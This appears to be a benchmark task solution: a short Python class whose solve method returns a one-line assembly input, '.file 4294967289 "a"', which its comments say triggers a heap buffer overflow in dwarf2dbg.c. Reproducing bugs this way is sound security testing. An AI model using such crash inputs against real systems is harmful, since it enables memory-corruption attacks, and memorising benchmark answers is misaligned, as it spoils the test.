import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability description specifies a heap buffer overflow in dwarf2dbg.c
        # triggered by the .file directive with a large integer value (4294967289).
        # This value (0xFFFFFFF9) triggers an integer overflow/signedness issue.
        # We construct a minimal valid assembly file with this directive.
        return b'.file 4294967289 "a"\n'
